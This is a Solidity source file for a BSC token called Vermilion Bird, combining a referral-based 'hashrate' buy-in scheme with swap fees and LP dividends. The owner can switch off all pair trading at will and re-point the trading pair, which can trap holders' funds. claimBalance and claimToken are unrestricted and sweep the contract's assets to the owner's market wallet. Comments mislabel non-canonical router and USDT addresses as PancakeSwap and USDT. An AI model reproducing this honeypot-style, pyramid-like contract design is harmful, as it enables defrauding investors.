/**
 *Submitted for verification at BscScan.com on 2023-02-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Pair {
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function sync() external;
}
abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

abstract contract BaseToken is IERC20, Ownable {
    
    event ProcessLP(uint256 time);
    event AddLiquit(address operater);
    event RemoveLiquit(address operater);

    struct UserInfo {
        uint256 totalBuy; // 总买的
        uint256 totalMint; // 总挖出的
        uint256 hashrate;  // 算力， 会衰减
        uint256 foreverHashrate;  // 永久算力
        uint256 remainClaimToken; // 已经挖出待领取得代币
        uint256 latestUpdateTime;  // 最近一次领取时间算力
        address parent; // 上级        
        address[] sons; // 下级
    }
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address private _marketAddress;
    mapping(address => UserInfo) private _userInfo; // 

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) private _feeWhiteList;

    uint256 private _totalSupply;

    ISwapRouter private _swapRouter;
    address private _usdt;
    mapping(address => bool) private _swapPairMap;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 public _startTradeBlock;
    uint256 public _waitForSwapAmount;
    address public _mainPair;

    uint256 public _limitAmount;

    uint public addPriceTokenAmount = 1e14;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply, address routerAddress, address usdtAddress, address marketAddress, address receiveAddress, uint256 LimitAmount){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(routerAddress);
        _usdt = usdtAddress;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        _mainPair = swapFactory.createPair(address(this), usdtAddress);
        _swapPairMap[_mainPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        _totalSupply = total;

        _balances[address(this)] = 20999900 * 10 ** Decimals;
        emit Transfer(address(0), address(this), _balances[address(this)]);

        _balances[receiveAddress] = total - _balances[address(this)];
        emit Transfer(address(0), receiveAddress, _balances[receiveAddress]);

        _marketAddress = marketAddress;

        _feeWhiteList[marketAddress] = true;
        _feeWhiteList[receiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(0x000000000000000000000000000000000000dEaD)] = true;

        excludeLpProvider[address(0)] = true;
        excludeLpProvider[address(0x000000000000000000000000000000000000dEaD)] = true;

        _lpRewardCondition = 10 * 10 ** IERC20(usdtAddress).decimals();
        _limitAmount = LimitAmount * 10** Decimals;

        _tokenDistributor = new TokenDistributor(usdtAddress);
        _startTradeBlock = 0;
    }

    function setAddPriceTokenAmount(uint _addPriceTokenAmount)external onlyOwner{
        addPriceTokenAmount = _addPriceTokenAmount;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function calcMintToken(address userAddress) public view returns (uint256) {
        UserInfo storage userInfo = _userInfo[userAddress];
        return (userInfo.hashrate/100)*((block.timestamp - userInfo.latestUpdateTime)/86400); // 
    }

    function _isLiquidity(address from,address to) internal view returns(bool isAdd,bool isDel){
        address token0 = IUniswapV2Pair(_mainPair).token0();
        (uint r0,,) = IUniswapV2Pair(_mainPair).getReserves();
        uint bal0 = IERC20(token0).balanceOf(_mainPair);
        if( _swapPairMap[to] ){
            if( token0 != address(this) && bal0 > r0 ){
                isAdd = bal0 - r0 > addPriceTokenAmount;
            }
        }
        if( _swapPairMap[from] ){
            if( token0 != address(this) && bal0 < r0 ){
                isDel = r0 - bal0 > 0; 
            }
        }
    }

    // BSC-USD的decimals是18
    function planA(uint256 amount, address parent) public  returns (bool success) {       
        require(amount == 1e20 || amount == 1e21 || amount == 1e22, "ERC20: buy usdt amount shoud 100U,1000U,10000U"); 
        require(IERC20(_usdt).balanceOf(msg.sender) >= amount, "ERC20: insufficient balance of USDT");     

        UserInfo storage userInfo = _userInfo[msg.sender];
        
        // 首次充值时自动设置只能设置一次上级，另外A->A不允许，还有A->B->A也不允许
        if(parent != address(0) && parent != msg.sender && userInfo.parent == address(0) && _userInfo[parent].parent != msg.sender){
            userInfo.parent = parent;
            // 增加推荐人的下级地址
            _userInfo[parent].sons.push(msg.sender);
        }
        // 转账成功才会执行下面的语句，如果没成功交易就会revert，直接返回了 
        IERC20(_usdt).transferFrom(msg.sender, address(this), amount); // 扣除sender的USDT
        userInfo.totalBuy += amount;
        // 更新算力值
        uint256 mintToken = calcMintToken(msg.sender);
        userInfo.hashrate = userInfo.hashrate + amount - mintToken;
        userInfo.foreverHashrate += mintToken/100; // 100点算力换成1点永久算力
        userInfo.remainClaimToken += mintToken;
        userInfo.latestUpdateTime = block.timestamp;
        _swapRouter.addLiquidity(address(this),_usdt,amount/2,amount/2,0,0,msg.sender,9999999999);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {       
        require(amount > 0, "ERC20: transfer amount must be greater than zero");
        bool isAddLiquidity;
        bool isDelLiquidity;
        ( isAddLiquidity, isDelLiquidity) = _isLiquidity(from,to);
        
        if (isAddLiquidity) { // 加池子
            emit AddLiquit(from);
        }
        if (isDelLiquidity){
            emit RemoveLiquit(to);
        }
        if (_feeWhiteList[from] || _feeWhiteList[to] || isAddLiquidity || isDelLiquidity){
            // from和to有一个是白名单用户就不扣手续费，加撤池子，正常转账
            _tokenTransfer(from, to, amount);
        }else if(_swapPairMap[from] || _swapPairMap[to]){
            // 交易开关打开才能交易
            require(_startTradeBlock > 0, "ERC20: trade do not start");
                

            if (_swapPairMap[to]) { // 卖 跟 加池子
                // 不能全部清空卖完
                require(amount <= (_balances[from])*99/100, "ERC20: sell amount exceeds balance 99%");
            }
            
            _tokenTransfer(from, _mainPair, amount/100); // 回流1%  
            _tokenTransfer(from, address(this), amount/50); // 2% 先缓存到本合约里，等合适得机会换USDT
            _waitForSwapAmount += amount/50;
             
        }else{
            if (!inSwap){    
                // 普通转账，不是在交易池子里换币
                swapUSDT(_waitForSwapAmount) ;// 置换USDT
                _waitForSwapAmount = 0;
            }
            // 普通转账
            _tokenTransfer(from, to, amount);
        }
        if (isAddLiquidity) { // 加池子
            addLpProvider(from); // 添加lp持有地址
        }
        if (from != address(this)) {
            processLP(500000);
        }
    }
    
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        _balances[recipient] = _balances[recipient] + tAmount;
        emit Transfer(sender, recipient, tAmount);
    }

    function swapUSDT(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _usdt;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );

        IERC20 USDT = IERC20(_usdt);
        uint256 usdtBalance = USDT.balanceOf(address(_tokenDistributor));
        USDT.transferFrom(address(_tokenDistributor), _marketAddress, usdtBalance/2); // 市场1%
        USDT.transferFrom(address(_tokenDistributor), address(this), usdtBalance/2); // 用于给所有lp分红
    }

    function setMarketAddress(address addr) external onlyOwner {
        _marketAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function startTrade() external onlyOwner {
        require(0 == _startTradeBlock, "trading");
        _startTradeBlock = block.number;
    }

    function closeTrade() external onlyOwner {
        _startTradeBlock = 0;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }    

    function setSwapPairMap(address addr, bool enable) external onlyOwner {
        _swapPairMap[addr] = enable;
    }

    function claimBalance() external {
        payable(_marketAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external {
        IERC20(token).transfer(_marketAddress, amount);
    }

    address[] private lpProviders;
    mapping(address => uint256) lpProviderIndex;
    mapping(address => bool) excludeLpProvider;

    function addLpProvider(address addr) private {
        if (0 == lpProviderIndex[addr]) {
            if (0 == lpProviders.length || lpProviders[0] != addr) {
                lpProviderIndex[addr] = lpProviders.length;
                lpProviders.push(addr);
            }
        }
    }

    function manulAddLpProvider(address addr) public onlyOwner {
        addLpProvider(addr);
    }

    function getLps() public view returns(address [] memory){
        return lpProviders;
    }

    uint256 private currentIndex;
    uint256 public _lpRewardCondition;
    uint256 public _progressLPTime;

    function setProgressLPTime(uint256 time) public onlyOwner {
        _progressLPTime=time;
    }

    function processLP(uint256 gas) public {
        uint256 timestamp = block.timestamp;
        if (_progressLPTime + 86400 > timestamp) {
            return;
        }
        IERC20 mainpair = IERC20(_mainPair);
        uint totalPair = mainpair.totalSupply();
        if (0 == totalPair) {
            return;
        }

        IERC20 token = IERC20(_usdt);
        uint256 tokenBalance = token.balanceOf(address(this));
        if (tokenBalance < _lpRewardCondition) {
            return;
        }

        address shareHolder;
        uint256 pairBalance;
        uint256 amount;

        uint256 shareholderCount = lpProviders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = lpProviders[currentIndex];
            pairBalance = mainpair.balanceOf(shareHolder);
            if (pairBalance > 0 && !excludeLpProvider[shareHolder]) {
                amount = tokenBalance * pairBalance / totalPair;
                if (amount > 0) {
                    token.transfer(shareHolder, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        _progressLPTime = timestamp;
    }

    function setLimitAmount(uint256 amount) external onlyOwner {
        _limitAmount = amount * 10 ** _decimals;
    }

    function setMainPair(address pair) external onlyOwner {
        _mainPair = pair;
    }

    function setLPRewardCondition(uint256 amount) external onlyOwner {
        _lpRewardCondition = amount;
    }

    function setExcludeLPProvider(address addr, bool enable) external onlyOwner {
        excludeLpProvider[addr] = enable;
    }

    receive() external payable {}
}

contract VermilionBird is BaseToken {
    constructor() BaseToken(
        "Vermilion Bird",
        "VB",
        18,
        21000000,
        address(0x444506226E57834a7d98998394587f2894947801), // PancakeSwap: Router v2
        address(0x7848EC33D21561b0755c423C7cf03f5018e18613), // USDT
        address(0xE2fcAc9dbCBCC8CBBaD00a955C7A72138D02efFe), // market
        address(0xE2fcAc9dbCBCC8CBBaD00a955C7A72138D02efFe), // 发行地址      
        1
    ){

    }
}